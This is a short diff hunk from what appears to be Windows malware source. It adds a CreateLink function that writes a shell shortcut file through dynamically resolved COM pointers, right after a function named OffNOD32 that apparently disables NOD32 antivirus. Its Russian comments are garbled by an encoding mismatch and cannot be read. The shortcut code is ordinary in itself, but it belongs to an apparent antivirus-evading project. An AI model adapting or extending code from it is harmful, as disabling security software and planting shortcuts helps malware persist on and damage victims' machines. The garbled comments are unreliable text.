@@ -3188,3 +3188,38 @@ VOID OffNOD32()
 		}
 	}
 }
+
+
+
+
+//---------------------------------------------------------
+//  ‘ункци€ создаЄт €рлык
+//  ѕараметры:
+//  	LinkFileName - »м€ файла создаваемого €рлыка
+//      Object - объект на который будет ссылатьс€ €рлык
+//      CommandLine - командна€ строка дл€ запуска обхекта
+//      Description - ќписание €рлыка/обхекта
+//      IconFileName - »м€ файла иконки
+//---------------------------------------------------------
+void CreateLink( const char* LinkFileName, const char* Object, const char* CommandLine,
+						const char* Description, const char* IconFileName )
+
+{
+  	pCoInitialize( NULL );
+	IShellLink* sl;
+	pCoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
+				   &IID_IShellLink, (void**)&sl );
+	sl->SetPath( Object );
+	sl->SetDescription( Description );
+	sl->SetArguments( CommandLine );
+	if(!STRA::IsEmpty(IconFileName))
+		sl->SetIconLocation( IconFileName, 0 );
+	IPersistFile* pf;
+	sl->QueryInterface( IID_IPersistFile, (void**)&pf );
+	wchar_t wpath[MAX_PATH];
+	pMultiByteToWideChar( CP_ACP, 0, LinkFileName, -1, wpath, MAX_PATH );
+	pf->Save( wpath, TRUE );
+	pf->Release();
+	sl->Release();
+	pCoUninitialize();
+}
